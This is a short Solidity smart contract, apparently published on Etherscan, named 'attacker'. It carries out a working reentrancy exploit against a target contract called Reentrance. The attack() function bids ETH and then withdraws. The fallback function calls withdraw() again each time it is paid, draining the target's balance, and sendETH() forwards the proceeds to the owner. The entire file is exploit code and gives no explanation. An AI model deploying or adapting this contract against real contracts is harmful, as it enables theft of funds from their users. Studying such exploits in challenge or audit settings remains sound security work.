/**
 *Submitted for verification at Etherscan.io on 2023-01-21
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

abstract contract Reentrance {
    function bid(address _to) public payable virtual;

    function withdraw() public virtual;
}

contract attacker {
    uint256 send;
    Reentrance reentrance;
    address public owner;

    constructor() public{
        owner=msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
    _   ;
    }

    fallback() external payable {
        reentrance.withdraw();
    }

    function attack(address targetAddr) external payable {
        send = msg.value;
        require(send>0,"price is 0");
        reentrance = Reentrance(targetAddr);
        reentrance.bid{value: send}(address(this));
        reentrance.withdraw();
    }

    function getTotal() public view returns(uint balance){
      return address(this).balance;
    }

    function sendETH() public onlyOwner(){
        msg.sender.transfer(getTotal());
    }
    
}